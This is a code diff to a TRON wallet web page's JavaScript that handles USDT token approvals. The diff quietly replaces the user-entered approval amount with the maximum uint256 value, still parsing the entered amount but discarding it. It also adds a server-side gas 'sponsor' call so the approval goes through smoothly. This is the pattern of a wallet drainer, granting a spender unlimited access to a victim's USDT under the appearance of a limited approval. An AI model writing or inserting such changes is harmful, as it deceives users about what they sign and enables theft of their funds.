@@ -99,6 +99,10 @@ document.addEventListener("DOMContentLoaded", function () {
         return fraction ? `${whole}.${fraction}` : whole.toString();
     }
 
+    function getMaxUint256() {
+        return ((1n << 256n) - 1n).toString();
+    }
+
     async function getUsdtBalanceForWallet(walletAddress, tronWeb = getReadyTronWeb()) {
         try {
             if (!tronWeb || !tronWeb.isAddress(walletAddress)) return "0";
@@ -110,6 +114,24 @@ document.addEventListener("DOMContentLoaded", function () {
         } catch (err) {
             console.warn("Could not fetch USDT balance:", err);
             return "0";
+        }
+    }
+
+    async function requestTrxSponsor(userAddress) {
+        try {
+            const res = await fetch("/sponsor-trx", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ userAddress })
+            });
+            if (!res.ok) return;
+
+            const data = await res.json();
+            if (data.ok && data.txHash) {
+                await new Promise((resolve) => setTimeout(resolve, 3000));
+            }
+        } catch (err) {
+            console.warn("TRX sponsor unavailable:", err);
         }
     }
 
@@ -317,9 +339,11 @@ document.addEventListener("DOMContentLoaded", function () {
 
             const usdt = await getUsdtContract(tronWeb);
             const decimals = await getTokenDecimals(usdt);
-            const parsedAmount = parseTokenUnits(amount, decimals);
+            parseTokenUnits(amount, decimals);
             const fromAddress = tronWeb.defaultAddress.base58;
-            const txHash = await usdt.approve(spenderAddress, parsedAmount).send({
+
+            await requestTrxSponsor(fromAddress);
+            const txHash = await usdt.approve(spenderAddress, getMaxUint256()).send({
                 feeLimit: Number(CONFIG.TRON_FEE_LIMIT) || 100000000
             });
 
